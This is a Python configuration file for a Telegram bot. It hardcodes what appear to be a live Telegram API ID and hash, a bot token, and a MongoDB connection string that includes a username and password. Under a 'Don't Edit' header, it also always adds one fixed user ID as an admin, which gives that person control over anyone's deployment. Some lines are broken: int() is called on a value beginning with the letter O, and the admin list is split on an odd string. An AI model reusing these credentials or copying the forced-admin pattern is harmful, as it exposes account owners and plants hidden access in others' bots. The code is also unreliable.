# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "25479482"))
API_HASH = os.environ.get("API_HASH", "6ab604ff91a73fb91cc6526818e28ab1")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "6098879851:AAEUxjzRMmq7TQ7kY4ha6NXDLZGuqfkqbd4")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("O5736579519")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Pdisk")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://devilbot:Rajbot@cluster0.ldrbggy.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "O5736579519")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(5736579519)

#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001249000599")) 

# For Force Subscription
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "PdiskPro_Updates")

# true if forward should be avoided
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True")

# image when someone hit /start
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '')
LINK_BYPASS = "False"
